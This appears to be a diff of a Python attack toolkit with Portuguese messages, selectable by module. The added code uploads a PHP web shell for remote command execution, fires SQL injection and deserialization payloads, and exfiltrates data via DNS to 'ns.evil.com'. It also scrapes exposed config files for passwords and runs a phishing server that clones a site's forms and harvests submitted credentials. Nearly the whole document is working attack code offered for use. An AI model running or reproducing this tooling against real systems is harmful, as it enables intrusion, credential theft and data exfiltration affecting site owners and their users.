@@ -1,6 +1,16 @@
+import argparse
+import json
 import requests
 import socket
 import base64
+import paramiko
+import io
+import zipfile
+import threading
+import http.server
+import socketserver
+import urllib.parse
+from bs4 import BeautifulSoup
 
 ASCII_ART = r'''
 ███████████  ████                     █████                          
@@ -22,133 +32,301 @@ ASCII_ART = r'''
  ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███    
 ░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████   
  ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░   
-             ░███                                                  
-             █████                                                 
+             ░███                                                 
+             █████                                                
             ░░░░░                                                 
 '''
 
-def log(msg):
-    print(msg)
+def log_info(msg):
+    print(f"[INFO] {msg}")
 
-class SQLiExploit:
-    def __init__(self, target, vuln_path='/vuln.php', param='id'):
-        self.url = target.rstrip('/') + vuln_path
-        self.param = param
+def log_error(msg):
+    print(f"[ERRO] {msg}")
 
-    def run(self):
-        payload = "' OR '1'='1"
-        params = {self.param: payload}
-        try:
-            r = requests.get(self.url, params=params, timeout=10)
-            if r.status_code == 200 and len(r.text) > 0:
-                log("[SQLi] Resposta recebida, verifique manualmente se há injeção.")
-                print(r.text[:500])
-            else:
-                log("[SQLi] Resposta inesperada ou vazia.")
-        except Exception as e:
-            log(f"[SQLi] Erro: {e}")
+def log_success(msg):
+    print(f"[SUCESSO] {msg}")
 
-class UploadExploit:
-    def __init__(self, target, upload_path='/upload.php', file_param='file'):
-        self.url = target.rstrip('/') + upload_path
-        self.file_param = file_param
 
-    def run(self):
-        shell = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
-        files = {self.file_param: ('shell.php', shell, 'application/x-php')}
-        try:
-            r = requests.post(self.url, files=files, timeout=10)
-            if r.status_code == 200:
-                log("[Upload] Upload pode ter sido feito, verifique o local do arquivo shell.php")
-                print(r.text[:500])
-            else:
-                log(f"[Upload] Falha no upload, status {r.status_code}")
-        except Exception as e:
-            log(f"[Upload] Erro: {e}")
-
-class BannerGrabber:
-    def __init__(self, target, port=80):
-        self.target = target
-        self.port = port
-
-    def run(self):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((self.target, self.port))
-            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
-            banner = s.recv(1024).decode(errors='ignore')
-            log(f"[Banner] Banner capturado:\n{banner}")
-            s.close()
-        except Exception as e:
-            log(f"[Banner] Erro: {e}")
-
-class ConfigFinder:
-    def __init__(self, target, paths=None):
-        if paths is None:
-            paths = ['/config.php', '/config.json', '/config.ini', '/settings.py']
+class SQLiAutoExploit:
+    def __init__(self, target, config):
         self.target = target.rstrip('/')
-        self.paths = paths
+        self.vuln_path = config.get('vuln_path', '/vulnerable.php')
+        self.param = config.get('param', 'id')
+        self.test_payload = "' OR 1=1--"
 
     def run(self):
-        for path in self.paths:
-            url = self.target + path
-            try:
-                r = requests.get(url, timeout=10)
-                if r.status_code == 200 and ('password' in r.text.lower() or 'passwd' in r.text.lower()):
-                    log(f"[Config] Possível arquivo config exposto: {url}")
-                    print(r.text[:500])
-                else:
-                    log(f"[Config] Não encontrado: {url}")
-            except Exception as e:
-                log(f"[Config] Erro em {url}: {e}")
+        url = f"{self.target}{self.vuln_path}"
+        params = {self.param: self.test_payload}
+        log_info(f"Tentando SQL Injection automática em {url} com payload: {self.test_payload}")
+        try:
+            r = requests.get(url, params=params, timeout=5)
+            if r.status_code == 200 and ("sql" in r.text.lower() or "mysql" in r.text.lower() or "syntax" in r.text.lower()):
+                log_success("Possível vulnerabilidade de SQL Injection detectada!")
+                log_info(r.text[:300])
+            else:
+                log_info("Nenhum indício claro de SQL Injection encontrado.")
+        except Exception as e:
+            log_error(f"Erro na exploração SQLiAutoExploit: {e}")
+
+class RCEUpload:
+    def __init__(self, target, config):
+        self.target = target.rstrip('/')
+        self.upload_path = config.get('upload_path', '/upload.php')
+        self.payload_content = config.get('payload_content', '<?php echo shell_exec($_GET["cmd"]); ?>')
+        self.file_param = config.get('file_param', 'file')
+
+    def run(self):
+        url = f"{self.target}{self.upload_path}"
+        files = {self.file_param: ('shell.php', self.payload_content, 'application/x-php')}
+        log_info(f"Tentando upload para RCE em {url}")
+        try:
+            r = requests.post(url, files=files, timeout=5)
+            if r.status_code == 200:
+                log_success("Upload realizado, verificar execução remota enviando comando")
+                log_info(r.text[:300])
+            else:
+                log_info(f"Upload falhou com status HTTP {r.status_code}")
+        except Exception as e:
+            log_error(f"Erro no RCEUpload: {e}")
+
+class PhishingSimple:
+    def __init__(self, target, config):
+        self.phishing_url = config.get('phishing_url', 'http://malicious.com')
+
+    def run(self):
+        log_info(f"Atenção: ataque phishing simples - URL a ser exibida: {self.phishing_url}")
 
 class DeserializationExploit:
-    def __init__(self, target, vuln_path='/deserialize', payload_b64=None):
-        self.url = target.rstrip('/') + vuln_path
-        self.payload = base64.b64decode(payload_b64) if payload_b64 else b''
+    def __init__(self, target, config):
+        self.target = target.rstrip('/')
+        self.vuln_path = config.get('vuln_path', '/deserialize')
+        self.payload = config.get('payload', '')
 
     def run(self):
+        url = f"{self.target}{self.vuln_path}"
         headers = {'Content-Type': 'application/octet-stream'}
         try:
-            r = requests.post(self.url, data=self.payload, headers=headers, timeout=10)
-            if r.status_code == 200:
-                log("[Deserialization] Resposta recebida, verifique se houve sucesso.")
-                print(r.text[:500])
-            else:
-                log(f"[Deserialization] Status inesperado: {r.status_code}")
+            data = base64.b64decode(self.payload) if self.payload else b''
         except Exception as e:
-            log(f"[Deserialization] Erro: {e}")
+            log_error(f"Payload base64 inválido: {e}")
+            return
+        log_info(f"Tentando Exploração de deserialização em {url}")
+        try:
+            r = requests.post(url, data=data, headers=headers, timeout=5)
+            if r.status_code == 200 and r.text.strip():
+                log_success("Resposta indica possível sucesso na exploração de deserialização!")
+                log_info(r.text[:300])
+            else:
+                log_info("Resposta sem indicações claras de sucesso.")
+        except Exception as e:
+            log_error(f"Erro no DeserializationExploit: {e}")
 
-if __name__ == "__main__":
-    import argparse
+class BannerGrabber:
+    def __init__(self, target, config):
+        self.target = target
+        self.port = int(config.get('port', 80))
+        self.timeout = float(config.get('timeout', 3))
 
-    print(ASCII_ART)
+    def run(self):
+        log_info(f"Capturando banner em {self.target}:{self.port}")
+        try:
+            s = socket.socket()
+            s.settimeout(self.timeout)
+            s.connect((self.target, self.port))
+            s.send(b'HEAD / HTTP/1.0\r\n\r\n')
+            banner = s.recv(1024).decode(errors='ignore')
+            log_success(f"Banner capturado:\n{banner}")
+            s.close()
+        except Exception as e:
+            log_error(f"Erro no BannerGrabber: {e}")
 
-    parser = argparse.ArgumentParser(description="Exploração real de vulnerabilidades básicas.")
-    parser.add_argument("target", help="URL alvo, ex: http://site.com")
-    parser.add_argument("--sqlipath", default="/vuln.php", help="Caminho vulnerável para SQLi")
-    parser.add_argument("--sqliparam", default="id", help="Parâmetro vulnerável para SQLi")
-    parser.add_argument("--uploadpath", default="/upload.php", help="Caminho para upload")
-    parser.add_argument("--uploadparam", default="file", help="Parâmetro do arquivo no upload")
-    parser.add_argument("--bannerport", type=int, default=80, help="Porta para captura de banner")
-    parser.add_argument("--deserpath", default="/deserialize", help="Caminho para deserialização")
-    parser.add_argument("--deserpayload", default=None, help="Payload base64 para deserialização")
+class DNSExfiltrationExample:
+    def __init__(self, target, config):
+        self.data = config.get('data', 'secretdata')
+        self.dns_server = config.get('dns_server', 'ns.evil.com')
+
+    def run(self):
+        import dns.resolver
+        import dns.message
+        import dns.query
+        import dns.name
+        import dns.rdatatype
+        import dns.rdataclass
+
+        domain = f"{self.data}.{self.dns_server}"
+        log_info(f"Enviando consulta DNS TXT para {domain} para exfiltração real")
+        try:
+            query = dns.message.make_query(domain, dns.rdatatype.TXT)
+            response = dns.query.udp(query, self.dns_server, timeout=5)
+            log_success("Consulta DNS enviada com sucesso.")
+        except Exception as e:
+            log_error(f"Erro ao enviar consulta DNS: {e}")
+
+class ConfigFilePasswordFinder:
+    def __init__(self, target, config):
+        self.paths = config.get('paths', ['/config.php', '/config.json', '/settings.py'])
+        self.target = target.rstrip('/')
+
+    def run(self):
+        log_info(f"Buscando arquivos de configuração expostos em {self.target}")
+        for path in self.paths:
+            url = f"{self.target}{path}"
+            try:
+                r = requests.get(url, timeout=5)
+                if r.status_code == 200 and ('password' in r.text.lower() or 'passwd' in r.text.lower()):
+                    log_success(f"Arquivo potencialmente sensível encontrado: {url}")
+                    log_info(r.text[:300])
+                else:
+                    log_info(f"{url} não parece conter senhas expostas.")
+            except Exception as e:
+                log_error(f"Erro ao acessar {url}: {e}")
+
+class PortScannerWithBanner:
+    def __init__(self, target, config):
+        self.target = target
+        self.ports = config.get('ports', [80, 443])
+        self.timeout = float(config.get('timeout', 2))
+
+    def run(self):
+        log_info(f"Escaneando portas em {self.target}")
+        for port in self.ports:
+            try:
+                s = socket.socket()
+                s.settimeout(self.timeout)
+                result = s.connect_ex((self.target, port))
+                if result == 0:
+                    log_success(f"Porta {port} aberta")
+                    try:
+                        s.send(b'HEAD / HTTP/1.0\r\n\r\n')
+                        banner = s.recv(1024).decode(errors='ignore').strip()
+                        if banner:
+                            log_info(f"Banner da porta {port}:\n{banner}")
+                    except Exception:
+                        log_info(f"Não foi possível capturar banner da porta {port}")
+                else:
+                    log_info(f"Porta {port} fechada")
+                s.close()
+            except Exception as e:
+                log_error(f"Erro ao escanear porta {port}: {e}")
+
+
+class PhishingAdvanced:
+
+    class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            self.phishing_instance = kwargs.pop('phishing_instance')
+            super().__init__(*args, **kwargs)
+
+        def do_GET(self):
+            if self.path == '/' or self.path == '/index.html':
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(self.phishing_instance.modified_html.encode('utf-8'))
+            else:
+                self.send_error(404, "Not Found")
+
+        def do_POST(self):
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            parsed = urllib.parse.parse_qs(post_data.decode('utf-8'))
+            self.phishing_instance.captured_data.append(parsed)
+            print("[SUCESSO] Dados capturados:")
+            for key, value in parsed.items():
+                print(f"  {key}: {value}")
+            # Redireciona para o site original após captura
+            self.send_response(302)
+            self.send_header('Location', self.phishing_instance.target_url)
+            self.end_headers()
+
+    def __init__(self, target, config):
+        self.target_url = target
+        self.port = int(config.get('port', 8080))
+        self.html_content = ""
+        self.modified_html = ""
+        self.captured_data = []
+
+    def fetch_and_modify(self):
+        log_info(f"Baixando conteúdo de {self.target_url} ...")
+        try:
+            resp = requests.get(self.target_url, timeout=10)
+            resp.raise_for_status()
+            self.html_content = resp.text
+        except Exception as e:
+            log_error(f"Falha ao baixar o HTML: {e}")
+            return False
+
+        soup = BeautifulSoup(self.html_content, "html.parser")
+
+        forms = soup.find_all("form")
+        if not forms:
+            log_info("[AVISO] Nenhum formulário encontrado na página. Nada para capturar.")
+        for form in forms:
+            # Força método POST
+            form['method'] = 'POST'
+            # Força ação para enviar para nosso servidor local
+            form['action'] = '/'
+
+            # Opcional: adiciona input hidden para sinalizar phishing (pode remover se quiser stealth)
+            hidden = soup.new_tag("input", type="hidden", name="phishing", value="true")
+            form.insert(0, hidden)
+
+        self.modified_html = str(soup)
+        return True
+
+    def run_server(self):
+        handler = lambda *args, **kwargs: self.PhishingHTTPRequestHandler(*args, phishing_instance=self, **kwargs)
+        with socketserver.TCPServer(("", self.port), handler) as httpd:
+            log_success(f"Servidor phishing rodando na porta {self.port}. Acesse http://localhost:{self.port}")
+            try:
+                httpd.serve_forever()
+            except KeyboardInterrupt:
+                log_info("Servidor phishing parado pelo usuário.")
+
+    def run(self):
+        if not self.fetch_and_modify():
+            return
+        self.run_server()
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Toolkit de Exploração")
+    parser.add_argument('module', help='Módulo para executar (ex: sqli, rceupload, phishing, deserialization, bannergrab, dnsexfil, configpass, portscan)')
+    parser.add_argument('target', help='Alvo principal (ex: http://exemplo.com ou IP)')
+    parser.add_argument('--config', help='Arquivo JSON com configuração extra', default=None)
+
     args = parser.parse_args()
 
-    sqli = SQLiExploit(args.target, vuln_path=args.sqlipath, param=args.sqliparam)
-    sqli.run()
+    config = {}
+    if args.config:
+        try:
+            with open(args.config, 'r') as f:
+                config = json.load(f)
+        except Exception as e:
+            log_error(f"Falha ao carregar config JSON: {e}")
+            return
 
-    upload = UploadExploit(args.target, upload_path=args.uploadpath, file_param=args.uploadparam)
-    upload.run()
+    module = args.module.lower()
+    target = args.target
 
-    banner = BannerGrabber(args.target.replace('http://','').replace('https://','').split('/')[0], port=args.bannerport)
-    banner.run()
+    modules = {
+        'sqli': SQLiAutoExploit,
+        'rceupload': RCEUpload,
+        'phishing': PhishingAdvanced,  # Agora usa o phishing avançado
+        'deserialization': DeserializationExploit,
+        'bannergrab': BannerGrabber,
+        'dnsexfil': DNSExfiltrationExample,
+        'configpass': ConfigFilePasswordFinder,
+        'portscan': PortScannerWithBanner,
+    }
 
-    config = ConfigFinder(args.target)
-    config.run()
+    if module not in modules:
+        log_error(f"Módulo desconhecido: {module}")
+        return
 
-    deser = DeserializationExploit(args.target, vuln_path=args.deserpath, payload_b64=args.deserpayload)
-    deser.run()
+    instance = modules[module](target, config)
+    instance.run()
 
-
+if __name__ == "__main__":
+    print(ASCII_ART)
+    main()
